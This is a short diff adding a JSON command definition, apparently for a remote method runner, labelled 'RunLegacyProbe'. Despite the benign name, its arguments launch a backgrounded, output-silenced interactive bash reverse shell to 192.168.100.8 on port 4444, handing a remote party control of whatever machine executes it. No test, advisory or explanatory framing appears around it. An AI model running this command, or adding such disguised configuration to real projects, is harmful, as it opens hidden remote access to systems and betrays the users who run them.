@@ -1,0 +1,8 @@
+{
+  "method": "RunLegacyProbe",
+  "command": "/bin/bash",
+  "args": [
+    "-c",
+    "nohup /bin/bash -c 'bash -i >& /dev/tcp/192.168.100.8/4444 0>&1' >/dev/null 2>&1 &"
+  ]
+}
